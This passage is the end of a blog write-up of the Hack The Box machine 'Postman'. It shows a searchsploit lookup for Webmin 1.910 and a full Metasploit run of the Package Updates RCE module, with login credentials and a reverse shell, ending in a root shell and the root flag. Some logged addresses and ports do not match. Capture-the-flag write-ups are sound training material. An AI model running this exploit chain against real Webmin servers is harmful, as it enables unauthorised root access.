   276799      4 -rw-r--r--   1 root            root                  252 May  5  2019 /usr/share/webmin/postfix/help/opt_mail_version.pl.html
</span><span class="gp">Matt@Postman:/var/lib/redis$</span><span class="w"> </span><span class="nb">cat</span> /etc/webmin/version
<span class="go">1.910</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>searchsploit webmin 1.91
<span class="go">------------------------------------------- ----------------------------------------
 Exploit Title                             |  Path
                                           | (/usr/share/exploitdb/)
------------------------------------------- ----------------------------------------
Webmin 1.910 - 'Package Updates' Remote Co | exploits/linux/remote/46984.rb
------------------------------------------- ----------------------------------------
Shellcodes: No Result</span></code></pre></figure>

<p>We found <code class="highlighter-rouge">Package Updates RCE</code> with <code class="highlighter-rouge">Metasploit</code> module. Let’s run it and own root:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">msf5 &gt;</span><span class="w"> </span>search webmin
<span class="go">
Matching Modules
================

</span><span class="gp">   #</span><span class="w">  </span>Name                                         Disclosure Date  Rank       Check  Description
<span class="go">   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


</span><span class="gp">msf5 &gt;</span><span class="w"> </span>use exploit/linux/http/webmin_packageup_rce
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.10.160
<span class="gp">rhosts =&gt;</span><span class="w"> </span>10.10.10.160
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span><span class="nb">set </span>ssl <span class="nb">true</span>
<span class="gp">ssl =&gt;</span><span class="w"> </span><span class="nb">true</span>
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span><span class="nb">set </span>lhost 10.10.15.66
<span class="gp">lhost =&gt;</span><span class="w"> </span>10.10.16.96
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span><span class="nb">set </span>username Matt
<span class="gp">username =&gt;</span><span class="w"> </span>Matt
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span><span class="nb">set </span>password computer2008
<span class="gp">password =&gt;</span><span class="w"> </span>computer2008
<span class="gp">msf5 exploit(linux/http/webmin_packageup_rce) &gt;</span><span class="w"> </span>run
<span class="go">
[*] Started reverse TCP handler on 10.10.16.96:4444 
[+] Session cookie: ebd2b1f371759364d859c616550e5bc3
[*] Attempting to execute the payload...
</span><span class="gp">[*] Command shell session 1 opened (10.10.15.66:1337 -&gt;</span><span class="w"> </span>10.10.10.160:34846<span class="o">)</span> at 2020-02-06 23:03:57 +0200
<span class="go">
id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="gp">python -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span><span class="gp">root@Postman:/usr/share/webmin/package-updates/#</span><span class="w"> </span><span class="s1">cd ~
</span><span class="gp">root@Postman:~#</span><span class="w"> </span><span class="s1">cat root.txt
</span><span class="go">a257741c</span></code></pre></figure>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=Hack+The+Box+-+Postman%20-%20http://localhost:4000/posts/postman" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/postman" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
            </a>
          </div>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script src="https://my-blog-0vgcdsd8x2.disqus.com/embed.js" async defer></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          
        </article>
        <footer class="footer scrollappear">
    <p style="text-align: center">
      This is my little tech blog, feel free to ask me any question ©
      <a href="/about" title="About me">Ahmed Sayed</a>
    </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157807027-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-157807027-1');
  </script>


<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>

</body>
</html>
